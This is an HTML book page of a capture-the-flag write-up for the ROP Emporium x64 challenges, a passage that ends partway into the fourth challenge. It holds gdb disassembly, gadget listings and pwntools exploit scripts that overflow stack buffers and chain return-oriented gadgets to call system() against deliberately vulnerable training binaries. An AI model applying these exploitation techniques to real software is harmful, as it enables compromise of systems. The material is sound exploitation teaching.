@@ -1,0 +1,1816 @@
+<!DOCTYPE HTML>
+<html lang="en" class="light" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>ROPEmporium Write-up</title>
+        <meta name="robots" content="noindex">
+
+
+        <!-- Custom HTML head -->
+        
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="favicon.svg">
+        <link rel="shortcut icon" href="favicon.png">
+        <link rel="stylesheet" href="css/variables.css">
+        <link rel="stylesheet" href="css/general.css">
+        <link rel="stylesheet" href="css/chrome.css">
+        <link rel="stylesheet" href="css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="highlight.css">
+        <link rel="stylesheet" href="tomorrow-night.css">
+        <link rel="stylesheet" href="ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+    </head>
+    <body class="sidebar-visible no-js">
+    <div id="body-container">
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('light')
+            html.classList.add(theme);
+            var body = document.querySelector('body');
+            body.classList.remove('no-js')
+            body.classList.add('js');
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var body = document.querySelector('body');
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            body.classList.remove('sidebar-visible');
+            body.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded affix "><a href="introduction.html">Introduction</a></li><li class="chapter-item expanded affix "><li class="part-title">Writeups</li><li class="chapter-item expanded "><a href="1.ret2win.html"><strong aria-hidden="true">1.</strong> ret2win</a></li><li class="chapter-item expanded "><a href="2.split.html"><strong aria-hidden="true">2.</strong> split</a></li><li class="chapter-item expanded "><a href="3.callme.html"><strong aria-hidden="true">3.</strong> callme</a></li><li class="chapter-item expanded "><a href="4.write4.html"><strong aria-hidden="true">4.</strong> write4</a></li><li class="chapter-item expanded "><a href="5.badchars.html"><strong aria-hidden="true">5.</strong> badchars</a></li><li class="chapter-item expanded "><a href="6.fluff.html"><strong aria-hidden="true">6.</strong> fluff</a></li><li class="chapter-item expanded "><a href="7.pivot.html"><strong aria-hidden="true">7.</strong> pivot</a></li><li class="chapter-item expanded "><a href="8.ret2csu.html"><strong aria-hidden="true">8.</strong> ret2csu</a></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <!-- Track and set sidebar scroll position -->
+        <script>
+            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
+            sidebarScrollbox.addEventListener('click', function(e) {
+                if (e.target.tagName === 'A') {
+                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
+                }
+            }, { passive: true });
+            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
+            sessionStorage.removeItem('sidebar-scroll');
+            if (sidebarScrollTop) {
+                // preserve sidebar scroll position when navigating via links within sidebar
+                sidebarScrollbox.scrollTop = sidebarScrollTop;
+            } else {
+                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
+                var activeSection = document.querySelector('#sidebar .active');
+                if (activeSection) {
+                    activeSection.scrollIntoView({ block: 'center' });
+                }
+            }
+        </script>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">ROPEmporium Write-up</h1>
+
+                    <div class="right-buttons">
+                        <a href="print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="introduction"><a class="header" href="#introduction">Introduction</a></h1>
+<p>This book is all about Write-ups in <a href="https://ropemporium.com/">ROP Emporium</a> x64 challenges.</p>
+<h2 id="brief-introduction-about-rop-and-rop-emporium"><a class="header" href="#brief-introduction-about-rop-and-rop-emporium">Brief introduction about ROP and ROP Emporium</a></h2>
+<h4 id="what-is-rop"><a class="header" href="#what-is-rop">What is ROP</a></h4>
+<p>ROP or Return Oriented Programming is a technique that is used when we have
+the control over the return address of a function to redirect and craft our own program using instructions
+that is presented in the binary or the library that is imported to the binary. these instructions
+are called <code>Gadgets</code> and when chained together they're called <code>ROP chain</code>.</p>
+<h4 id="what-is-rop-emporium"><a class="header" href="#what-is-rop-emporium">What is ROP Emporium</a></h4>
+<p>ROP Emporium is a website that provides a series of challenges in ROP that teachs us
+about using ROP in exploitation.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="1-ret2win"><a class="header" href="#1-ret2win">1. ret2win</a></h1>
+<p>the first challenge of ROP Emporium serie.<br />
+this challenge wants us to locate a method that will lead us to get
+the flag.</p>
+<p>so let's started off by looking at functions in gdb</p>
+<pre><code>gef➤  info functions
+All defined functions:
+
+Non-debugging symbols:
+0x0000000000400528  _init
+0x0000000000400550  puts@plt
+0x0000000000400560  system@plt
+0x0000000000400570  printf@plt
+0x0000000000400580  memset@plt
+0x0000000000400590  read@plt
+0x00000000004005a0  setvbuf@plt
+0x00000000004005b0  _start
+0x00000000004005e0  _dl_relocate_static_pie
+0x00000000004005f0  deregister_tm_clones
+0x0000000000400620  register_tm_clones
+0x0000000000400660  __do_global_dtors_aux
+0x0000000000400690  frame_dummy
+0x0000000000400697  main
+0x00000000004006e8  pwnme
+0x0000000000400756  ret2win
+0x0000000000400780  __libc_csu_init
+0x00000000004007f0  __libc_csu_fini
+0x00000000004007f4  _fini
+</code></pre>
+<p>we can see that there are multiple functions such as <code>pwnme</code> and <code>ret2win</code>, let's see pwnme first.</p>
+<pre><code>gef➤  disas pwnme
+Dump of assembler code for function pwnme:
+   0x00000000004006e8 &lt;+0&gt;:     push   rbp
+   0x00000000004006e9 &lt;+1&gt;:     mov    rbp,rsp
+   0x00000000004006ec &lt;+4&gt;:     sub    rsp,0x20
+   0x00000000004006f0 &lt;+8&gt;:     lea    rax,[rbp-0x20]
+   0x00000000004006f4 &lt;+12&gt;:    mov    edx,0x20
+   0x00000000004006f9 &lt;+17&gt;:    mov    esi,0x0
+   0x00000000004006fe &lt;+22&gt;:    mov    rdi,rax
+   0x0000000000400701 &lt;+25&gt;:    call   0x400580 &lt;memset@plt&gt;
+   0x0000000000400706 &lt;+30&gt;:    mov    edi,0x400838
+   0x000000000040070b &lt;+35&gt;:    call   0x400550 &lt;puts@plt&gt;
+   0x0000000000400710 &lt;+40&gt;:    mov    edi,0x400898
+   0x0000000000400715 &lt;+45&gt;:    call   0x400550 &lt;puts@plt&gt;
+   0x000000000040071a &lt;+50&gt;:    mov    edi,0x4008b8
+   0x000000000040071f &lt;+55&gt;:    call   0x400550 &lt;puts@plt&gt;
+   0x0000000000400724 &lt;+60&gt;:    mov    edi,0x400918
+   0x0000000000400729 &lt;+65&gt;:    mov    eax,0x0
+   0x000000000040072e &lt;+70&gt;:    call   0x400570 &lt;printf@plt&gt;
+   0x0000000000400733 &lt;+75&gt;:    lea    rax,[rbp-0x20]
+   0x0000000000400737 &lt;+79&gt;:    mov    edx,0x38
+   0x000000000040073c &lt;+84&gt;:    mov    rsi,rax
+   0x000000000040073f &lt;+87&gt;:    mov    edi,0x0
+   0x0000000000400744 &lt;+92&gt;:    call   0x400590 &lt;read@plt&gt;
+   0x0000000000400749 &lt;+97&gt;:    mov    edi,0x40091b
+   0x000000000040074e &lt;+102&gt;:   call   0x400550 &lt;puts@plt&gt;
+   0x0000000000400753 &lt;+107&gt;:   nop
+   0x0000000000400754 &lt;+108&gt;:   leave
+   0x0000000000400755 &lt;+109&gt;:   ret
+End of assembler dump.
+</code></pre>
+<p>there's a memory allocation of <code>0x20</code> bytes. and there's a read that uses the buffer
+of <code>0x20</code> allocated earlier so there's clearly a buffer overflow going on.</p>
+<p>with this knowledge let's try to input <code>0x20</code> + <code>0x8</code> bytes and then the address of the function
+we want to call, and let's call ret2win function.</p>
+<p>but first let's look at the content of <code>ret2win</code> function.</p>
+<pre><code>gef➤  disas ret2win
+Dump of assembler code for function ret2win:
+   0x0000000000400756 &lt;+0&gt;:     push   rbp
+   0x0000000000400757 &lt;+1&gt;:     mov    rbp,rsp
+   0x000000000040075a &lt;+4&gt;:     mov    edi,0x400926
+   0x000000000040075f &lt;+9&gt;:     call   0x400550 &lt;puts@plt&gt;
+   0x0000000000400764 &lt;+14&gt;:    mov    edi,0x400943
+   0x0000000000400769 &lt;+19&gt;:    call   0x400560 &lt;system@plt&gt;
+   0x000000000040076e &lt;+24&gt;:    nop
+   0x000000000040076f &lt;+25&gt;:    pop    rbp
+   0x0000000000400770 &lt;+26&gt;:    ret
+End of assembler dump.
+</code></pre>
+<p>we can see that there's a call to system but what's the argument exactly?</p>
+<pre><code>gef➤  x/s 0x400943
+0x400943:       "/bin/cat flag.txt"
+</code></pre>
+<p>ah!, so the function is used to cat the flag out so let's craft our payload and call it now!</p>
+<pre><code class="language-python">from pwn import *
+
+p = process("./ret2win")
+
+p.sendline(b"A"*40 + p64(0x400757))
+
+print(p.recvall().decode("utf-8"))
+</code></pre>
+<p>and here's the result.</p>
+<pre><code>┌──(kali㉿kali)-[~/ctf/rop/ret2win]
+└─$ python solve.py
+[+] Starting local process './ret2win': pid 2756
+[+] Receiving all data: Done (329B)
+[*] Process './ret2win' stopped with exit code 0 (pid 2756)
+ret2win by ROP Emporium
+x86_64
+
+For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
+What could possibly go wrong?
+You there, may I have your input please? And don't worry about null bytes, we're using read()!
+
+&gt; Thank you!
+Well done! Here's your flag:
+ROPE{a_placeholder_32byte_flag!}
+</code></pre>
+<p>here we go there's the flag!</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="2-split"><a class="header" href="#2-split">2. split</a></h1>
+<p>the second challenge, now the element of the first challenge is still present
+in this challenge but the string <code>"/bin/cat flag.txt"</code> is not in the same function
+as the first challenge, we have to somehow find the string and put it in the register and
+call the system function.</p>
+<p>in this challenge the binary is NX enabled so we can't just execute the stack.
+now we really need to use ROP to solve the challenge, we can check the binary permissions using
+<code>rabin2</code> or <code>checksec</code>, I'll use <code>rabin2</code> here.</p>
+<pre><code>┌──(kali㉿kali)-[~/ctf/rop/split]
+└─$ rabin2 -I split
+arch     x86
+baddr    0x400000
+binsz    6805
+bintype  elf
+bits     64
+canary   false
+class    ELF64
+compiler GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
+crypto   false
+endian   little
+havecode true
+intrp    /lib64/ld-linux-x86-64.so.2
+laddr    0x0
+lang     c
+linenum  true
+lsyms    true
+machine  AMD x86-64 architecture
+nx       true
+os       linux
+pic      false
+relocs   true
+relro    partial
+rpath    NONE
+sanitize false
+static   false
+stripped false
+subsys   linux
+va       true
+</code></pre>
+<p>now, let's investigate the binary using <code>gdb</code>.</p>
+<pre><code>gef➤  info functions
+All defined functions:
+
+Non-debugging symbols:
+0x0000000000400528  _init
+0x0000000000400550  puts@plt
+0x0000000000400560  system@plt
+0x0000000000400570  printf@plt
+0x0000000000400580  memset@plt
+0x0000000000400590  read@plt
+0x00000000004005a0  setvbuf@plt
+0x00000000004005b0  _start
+0x00000000004005e0  _dl_relocate_static_pie
+0x00000000004005f0  deregister_tm_clones
+0x0000000000400620  register_tm_clones
+0x0000000000400660  __do_global_dtors_aux
+0x0000000000400690  frame_dummy
+0x0000000000400697  main
+0x00000000004006e8  pwnme
+0x0000000000400742  usefulFunction
+0x0000000000400760  __libc_csu_init
+0x00000000004007d0  __libc_csu_fini
+0x00000000004007d4  _fini
+</code></pre>
+<p>interesting, what's inside the <code>usefulFunction</code>..?</p>
+<pre><code>gef➤  disas usefulFunction
+Dump of assembler code for function usefulFunction:
+   0x0000000000400742 &lt;+0&gt;:     push   rbp
+   0x0000000000400743 &lt;+1&gt;:     mov    rbp,rsp
+   0x0000000000400746 &lt;+4&gt;:     mov    edi,0x40084a
+   0x000000000040074b &lt;+9&gt;:     call   0x400560 &lt;system@plt&gt;
+   0x0000000000400750 &lt;+14&gt;:    nop
+   0x0000000000400751 &lt;+15&gt;:    pop    rbp
+   0x0000000000400752 &lt;+16&gt;:    ret
+End of assembler dump.
+</code></pre>
+<p>oh, so it's pretty similar to the <code>ret2win</code> function from the previous challenge
+what's the string being put in the register let's see...</p>
+<pre><code>gef➤  x/s 0x40084a
+0x40084a:       "/bin/ls"
+</code></pre>
+<p>ah, so it's just a function to call ls using the system, I'm sure this function is present for the
+binary to present system inside the binary.</p>
+<p>now, let's find some useful strings in the binary using <code>rabin2</code>.</p>
+<pre><code>┌──(kali㉿kali)-[~/ctf/rop/split]
+└─$ rabin2 -z split
+[Strings]
+nth paddr      vaddr      len size section type  string
+―――――――――――――――――――――――――――――――――――――――――――――――――――――――
+0   0x000007e8 0x004007e8 21  22   .rodata ascii split by ROP Emporium
+1   0x000007fe 0x004007fe 7   8    .rodata ascii x86_64\n
+2   0x00000806 0x00400806 8   9    .rodata ascii \nExiting
+3   0x00000810 0x00400810 43  44   .rodata ascii Contriving a reason to ask user for data...
+4   0x0000083f 0x0040083f 10  11   .rodata ascii Thank you!
+5   0x0000084a 0x0040084a 7   8    .rodata ascii /bin/ls
+0   0x00001060 0x00601060 17  18   .data   ascii /bin/cat flag.txt
+</code></pre>
+<p>rabin2 is pretty cool that it also tell us the string address.</p>
+<p>okay, let's find ROP gadgets to craft our ROP chain, I'll be using <code>ROPgadget</code> to do that.
+but first let's see what do we need to craft our ROP chain.</p>
+<p>first we need to set <code>rdi</code> register to the address of the string we want to use.
+then we need to call the system function. easy enough let's find it.</p>
+<pre><code>┌──(kali㉿kali)-[~/ctf/rop/split]
+└─$ ROPgadget --binary split | grep rdi
+0x0000000000400288 : loope 0x40025a ; sar dword ptr [rdi - 0x5133700c], 0x1d ; retf 0xe99e
+0x00000000004007c3 : pop rdi ; ret
+0x000000000040028a : sar dword ptr [rdi - 0x5133700c], 0x1d ; retf 0xe99e
+</code></pre>
+<p>we got both the system function address and our gadget now let's craft our ROP chain.</p>
+<pre><code class="language-python">from pwn import *
+
+p = process("./split")
+
+padding = b"X"*40
+shell_str_addr = 0x601060
+system_addr = 0x400560
+pop_rdi = 0x4007c3
+
+payload = padding + p64(pop_rdi) + p64(shell_str_addr) + p64(system_addr)
+
+p.sendline(payload)
+print(p.recvall().decode("utf-8"))
+</code></pre>
+<p>here we go...</p>
+<pre><code>┌──(kali㉿kali)-[~/ctf/rop/split]
+└─$ python write-up.py
+[+] Starting local process './split': pid 3485
+[+] Receiving all data: Done (87B)
+[*] Stopped process './split' (pid 3485)
+split by ROP Emporium
+x86_64
+
+Contriving a reason to ask user for data...
+&gt; Thank you!
+</code></pre>
+<p>huh? what happened why don't we get our flag let's investigate some more by attaching gdb to the process.</p>
+<p>let's edit our script a bit.</p>
+<pre><code class="language-python">from pwn import *
+
+p = process("./split")
+script = """
+break *0x400560
+"""
+
+gdb.attach(p, gdbscript=script)
+
+padding = b"X"*40
+shell_str_addr = 0x601060
+system_addr = 0x400560
+pop_rdi = 0x4007c3
+
+payload = padding + p64(pop_rdi) + p64(shell_str_addr) + p64(system_addr)
+
+p.sendline(payload)
+print(p.recvall().decode("utf-8"))
+</code></pre>
+<p>now let's debug!</p>
+<pre><code>     0x400550 &lt;puts@plt+0&gt;     jmp    QWORD PTR [rip+0x200ac2]        # 0x601018 &lt;puts@got.plt&gt;
+     0x400556 &lt;puts@plt+6&gt;     push   0x0
+     0x40055b &lt;puts@plt+11&gt;    jmp    0x400540
+●→   0x400560 &lt;system@plt+0&gt;   jmp    QWORD PTR [rip+0x200aba]        # 0x601020 &lt;system@got.plt&gt;
+     0x400566 &lt;system@plt+6&gt;   push   0x1
+     0x40056b &lt;system@plt+11&gt;  jmp    0x400540
+     0x400570 &lt;printf@plt+0&gt;   jmp    QWORD PTR [rip+0x200ab2]        # 0x601028 &lt;printf@got.plt&gt;
+     0x400576 &lt;printf@plt+6&gt;   push   0x2
+     0x40057b &lt;printf@plt+11&gt;  jmp    0x400540
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "split", stopped 0x400560 in system@plt (), reason: BREAKPOINT
+</code></pre>
+<p>breakpoint hit let's step into it.</p>
+<pre><code>────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+   0x7f05949535f4 &lt;do_system+324&gt;  mov    QWORD PTR [rsp+0x60], r12
+   0x7f05949535f9 &lt;do_system+329&gt;  mov    r9, QWORD PTR [rax]
+   0x7f05949535fc &lt;do_system+332&gt;  lea    rsi, [rip+0x149a4c]        # 0x7f0594a9d04f
+ → 0x7f0594953603 &lt;do_system+339&gt;  movaps XMMWORD PTR [rsp+0x50], xmm0
+   0x7f0594953608 &lt;do_system+344&gt;  mov    QWORD PTR [rsp+0x68], 0x0
+   0x7f0594953611 &lt;do_system+353&gt;  call   0x7f05949fd230 &lt;__GI___posix_spawn&gt;
+   0x7f0594953616 &lt;do_system+358&gt;  mov    rdi, rbx
+   0x7f0594953619 &lt;do_system+361&gt;  mov    r12d, eax
+   0x7f059495361c &lt;do_system+364&gt;  call   0x7f05949fd130 &lt;__posix_spawnattr_destroy&gt;
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "split", stopped 0x7f0594953603 in do_system (), reason: SIGSEGV
+</code></pre>
+<p>why did we get SIGSEGV here, interesting...<br />
+after some reasearching i found this:</p>
+<blockquote>
+<p>The MOVAPS issue
+If you're segfaulting on a movaps instruction in buffered_vfprintf() or do_system() in the x86_64 challenges, then ensure the stack is 16-byte aligned before returning to GLIBC functions such as printf() or system(). Some versions of GLIBC uses movaps instructions to move data onto the stack in certain functions. The 64 bit calling convention requires the stack to be 16-byte aligned before a call instruction but this is easily violated during ROP chain execution, causing all further calls from that function to be made with a misaligned stack. movaps triggers a general protection fault when operating on unaligned data, so try padding your ROP chain with an extra ret before returning into a function or return further into a function to skip a push instruction.</p>
+</blockquote>
+<p>so basically our <code>rsp</code> is not 16-byte aligned before calling do_system, we can check that by listing our registers.</p>
+<pre><code>gef➤  info registers
+rax            0x7f0594ae2320      0x7f0594ae2320
+rbx            0x7ffdb45c3948      0x7ffdb45c3948
+rcx            0x7ffdb45c3948      0x7ffdb45c3948
+rdx            0x0                 0x0
+rsi            0x7f0594a9d04f      0x7f0594a9d04f
+rdi            0x7ffdb45c3744      0x7ffdb45c3744
+rbp            0x7ffdb45c37a8      0x7ffdb45c37a8
+rsp            0x7ffdb45c3738      0x7ffdb45c3738
+r8             0x7ffdb45c3788      0x7ffdb45c3788
+r9             0x7ffdb45c3be8      0x7ffdb45c3be8
+r10            0x8                 0x8
+</code></pre>
+<p>see? our <code>rsp</code> ends with <code>0x8</code> which means our stack is not 16-byte aligned.</p>
+<p>so we need to make our <code>rsp</code> 16-byte aligned. let's find extra <code>ret</code> to do that.</p>
+<pre><code>0x000000000040053e : ret
+</code></pre>
+<p>cool!, now let's pad our ROP to make our <code>rsp</code> 16-byte aligned.</p>
+<pre><code class="language-python">from pwn import *
+
+p = process("./split")
+script = """
+break *0x400560
+"""
+
+gdb.attach(p, gdbscript=script)
+
+padding = b"X"*40
+shell_str_addr = 0x601060
+system_addr = 0x400560
+pop_rdi = 0x4007c3
+ret = 0x40053e
+
+payload = padding + p64(pop_rdi) + p64(shell_str_addr) + p64(ret) + p64(system_addr)
+
+p.sendline(payload)
+print(p.recvall().decode("utf-8"))
+</code></pre>
+<p>this should work now let's try it!.</p>
+<pre><code>┌──(kali㉿kali)-[~/ctf/rop/split]
+└─$ python write-up.py
+[+] Starting local process './split': pid 3742
+[*] running in new terminal: ['/usr/bin/gdb', '-q', './split', '3742', '-x', '/tmp/pwnobnrixxs.gdb']                                   [+] Waiting for debugger: Done
+[+] Receiving all data: Done (120B)
+[*] Stopped process './split' (pid 3742)
+split by ROP Emporium
+x86_64
+
+Contriving a reason to ask user for data...
+&gt; Thank you!
+ROPE{a_placeholder_32byte_flag!}
+</code></pre>
+<p>let's go! we got the flag!!!</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="3-callme"><a class="header" href="#3-callme">3. callme</a></h1>
+<p>the third challenge, this challenge wants us to make consecutive function
+calls from <code>plt</code>.</p>
+<blockquote>
+<p>You must call the callme_one(), callme_two() and callme_three() functions in that order, each with the arguments 0xdeadbeef, 0xcafebabe, 0xd00df00d e.g. callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d) to print the flag. For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)</p>
+</blockquote>
+<p>so let's begin finding the function address and gadgets we want to use.</p>
+<p>using <code>rabin2</code></p>
+<pre><code>┌──(kali㉿kali)-[~/ctf/rop/callme]
+└─$ rabin2 -i callme
+[Imports]
+nth vaddr      bind   type   lib name
+―――――――――――――――――――――――――――――――――――――
+1   0x004006d0 GLOBAL FUNC       puts
+2   0x004006e0 GLOBAL FUNC       printf
+3   0x004006f0 GLOBAL FUNC       callme_three
+4   0x00400700 GLOBAL FUNC       memset
+5   0x00400710 GLOBAL FUNC       read
+6   0x00000000 GLOBAL FUNC       __libc_start_main
+7   0x00400720 GLOBAL FUNC       callme_one
+8   0x00000000 WEAK   NOTYPE     __gmon_start__
+9   0x00400730 GLOBAL FUNC       setvbuf
+10  0x00400740 GLOBAL FUNC       callme_two
+11  0x00400750 GLOBAL FUNC       exit
+</code></pre>
+<p>now, since we are in <code>x64</code> challenge we have to know the calling convention so we can supply the correct arguments.</p>
+<p>we have to set <code>rdi, rsi, rdx</code> in order to call a function with 3 parameters. let's find the gadgets for this.
+also don't forget to look into the <code>usefulGadgets</code> and <code>usefulFunction</code> in the binary.</p>
+<pre><code>gef➤  disas usefulFunction
+Dump of assembler code for function usefulFunction:
+   0x00000000004008f2 &lt;+0&gt;:	push   rbp
+   0x00000000004008f3 &lt;+1&gt;:	mov    rbp,rsp
+   0x00000000004008f6 &lt;+4&gt;:	mov    edx,0x6
+   0x00000000004008fb &lt;+9&gt;:	mov    esi,0x5
+   0x0000000000400900 &lt;+14&gt;:	mov    edi,0x4
+   0x0000000000400905 &lt;+19&gt;:	call   0x4006f0 &lt;callme_three@plt&gt;
+   0x000000000040090a &lt;+24&gt;:	mov    edx,0x6
+   0x000000000040090f &lt;+29&gt;:	mov    esi,0x5
+   0x0000000000400914 &lt;+34&gt;:	mov    edi,0x4
+   0x0000000000400919 &lt;+39&gt;:	call   0x400740 &lt;callme_two@plt&gt;
+   0x000000000040091e &lt;+44&gt;:	mov    edx,0x6
+   0x0000000000400923 &lt;+49&gt;:	mov    esi,0x5
+   0x0000000000400928 &lt;+54&gt;:	mov    edi,0x4
+   0x000000000040092d &lt;+59&gt;:	call   0x400720 &lt;callme_one@plt&gt;
+   0x0000000000400932 &lt;+64&gt;:	mov    edi,0x1
+   0x0000000000400937 &lt;+69&gt;:	call   0x400750 &lt;exit@plt&gt;
+End of assembler dump.
+gef➤  disas usefulGadgets
+Dump of assembler code for function usefulGadgets:
+   0x000000000040093c &lt;+0&gt;:	pop    rdi
+   0x000000000040093d &lt;+1&gt;:	pop    rsi
+   0x000000000040093e &lt;+2&gt;:	pop    rdx
+   0x000000000040093f &lt;+3&gt;:	ret
+End of assembler dump.
+</code></pre>
+<p>let's use <code>ROPgadget</code> to find the gadgets we needed.</p>
+<pre><code>┌──(kali㉿kali)-[~/ctf/rop/callme]
+└─$ ROPgadget --binary callme | grep rdi
+0x0000000000400a3d : add byte ptr [rax], al ; add byte ptr [rbp + rdi*8 - 1], ch ; call qword ptr [rax + 0x23000000]
+0x0000000000400a3f : add byte ptr [rbp + rdi*8 - 1], ch ; call qword ptr [rax + 0x23000000]
+0x0000000000400a3c : add byte ptr fs:[rax], al ; add byte ptr [rbp + rdi*8 - 1], ch ; call qword ptr [rax + 0x23000000]
+0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret
+0x00000000004009a3 : pop rdi ; ret
+</code></pre>
+<p>thanks to the <code>usefulGadgets</code> function.</p>
+<p>now, since we already know what are the parameters needed to be supply let's craft the payload.</p>
+<pre><code class="language-python">from pwn import *
+
+p = process("./callme")
+
+padding = b"X"*40
+call_one = 0x400720
+call_two = 0x400740
+call_three = 0x4006f0
+
+arg_1 = 0xdeadbeefdeadbeef
+arg_2 = 0xcafebabecafebabe
+arg_3 = 0xd00df00dd00df00d
+
+pop_rdi_rsi_rdx = 0x40093c
+
+set_reg = p64(pop_rdi_rsi_rdx) + p64(arg_1) + p64(arg_2)  + p64(arg_3)
+payload = padding + set_reg + p64(call_one) + set_reg + p64(call_two) + set_reg + p64(call_three)
+
+p.sendline(payload)
+print(p.recvall().decode("utf-8"))
+</code></pre>
+<p>let's run it.</p>
+<pre><code>┌──(kali㉿kali)-[~/ctf/rop/callme]
+└─$ python solve.py
+[+] Starting local process './callme': pid 1230
+[*] Switching to interactive mode
+callme by ROP Emporium
+[*] Process './callme' stopped with exit code 0 (pid 1230)
+x86_64
+
+Hope you read the instructions...
+
+&gt; Thank you!
+callme_one() called correctly
+callme_two() called correctly
+ROPE{a_placeholder_32byte_flag!}
+</code></pre>
+<p>nice.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="4-write4"><a class="header" href="#4-write4">4. write4</a></h1>
+<p>the forth challenge, this challenge is a little bit different from the others previously.<br />
+in this challenge, the binary provided a function to <code>print_file</code> for us, but there's
+no <code>"flag.txt"</code> string in the binary, so we somehow have to write <code>"flag.txt"</code> into the binary ourselve.<br />
+so how do we write into the memory? there's an instruction that we can use such as <code>mov [reg], reg</code>
+that allow us to write a value into the memory.</p>
+<p>so where do we write the string into? let's check the binary for sections we can write into
+and section that when we write into will not cause us any problems if we need some kind of stability in our exploit.</p>
+<pre><code>┌──(kali㉿kali)-[~/ctf/rop/write4]
+└─$ rabin2 -S write4
+[Sections]
+
+nth paddr        size vaddr       vsize perm name
+―――――――――――――――――――――――――――――――――――――――――――――――――
+---
+18  0x00000df0    0x8 0x00600df0    0x8 -rw- .init_array
